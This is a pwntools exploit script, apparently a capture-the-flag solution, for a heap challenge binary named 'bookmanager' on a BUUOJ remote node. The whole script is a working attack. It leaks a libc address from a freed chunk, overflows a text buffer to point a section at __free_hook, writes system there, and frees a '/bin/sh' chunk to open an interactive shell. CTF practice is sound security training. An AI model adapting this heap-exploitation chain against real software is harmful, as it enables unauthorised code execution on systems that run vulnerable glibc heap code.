from pwn import *

# r=process('./bookmanager')
r=remote('node4.buuoj.cn',27281)
libc=ELF('./libc-old/libc-2.23.so')
context.log_level='debug'
menu = "Your choice:"
def add_chapter(content):
    r.recvuntil(menu)
    r.sendline('1')
    r.recvuntil("Chapter name:")
    r.send(content)

def add_section(chapter, content):
    r.recvuntil(menu)
    r.sendline('2')
    r.recvuntil("Which chapter do you want to add into:")
    r.send(chapter)
    r.recvuntil("0x")
    addr = int(r.recvuntil('\n').strip(), 16)
    r.recvuntil("Section name:")
    r.send(content)
    return addr

def add_text(section, size, content):
    r.recvuntil(menu)
    r.sendline('3')
    r.recvuntil("Which section do you want to add into:")
    r.send(section)
    r.recvuntil("How many chapters you want to write:")    #max:0x100 
    r.sendline(str(size))
    r.recvuntil("Text:")
    r.send(content)

def delete_chapter(name):
    r.recvuntil(menu)
    r.sendline('4')
    r.recvuntil("Chapter name:")
    r.send(name)

def delete_section(name):
    r.recvuntil(menu)
    r.sendline('5')
    r.recvuntil("Section name:")
    r.send(name)

def delete_text(name):
    r.recvuntil(menu)
    r.sendline('6')
    r.recvuntil("Section name:")
    r.send(name)

def show():
    r.recvuntil(menu)
    r.sendline('7')

def edit(type, name, content):
    r.recvuntil(menu)
    r.sendline('8')
    r.recvuntil("What to update?(Chapter/Section/Text):")
    r.sendline(type)
    if type == 'Chapter':
        r.recvuntil("Chapter name:")
        r.send(name)
        r.recvuntil("New Chapter name:")
        r.send(content)

    elif type == 'Section':
        r.recvuntil("Section name:")
        r.send(name)
        r.recvuntil("New Section name:")
        r.send(content)
    else:
        r.recvuntil("Section name:")
        r.send(name)
        r.recvuntil("New Text:")
        r.send(content)

r.recvuntil('create: ')
r.sendline('PYozo')

add_chapter('one')
add_section('one','c' * 8)
add_text('c' * 8,0x80,'d' * 8)
add_chapter('\x01')
delete_text('cccccccc')
add_text('cccccccc',0x80,'aaaaaaaa')
show()
libc.address = u64(r.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 88 - 0x10- libc.sym['__malloc_hook']
free_hook=libc.sym['__free_hook']
system=libc.sym['system']

add_text('cccccccc',0x10,'\x01')
payload = b'/bin/sh\x00' + b'a' * 8 + p64(0) + p64(0x41) + b'dddddddd' + p64(0) * 3 + p64(free_hook)
add_section('one','dddddddd')
edit('Text','cccccccc',payload)
edit('Text','dddddddd',p64(system))
delete_text('cccccccc')
#gdb.attach(r)
r.interactive()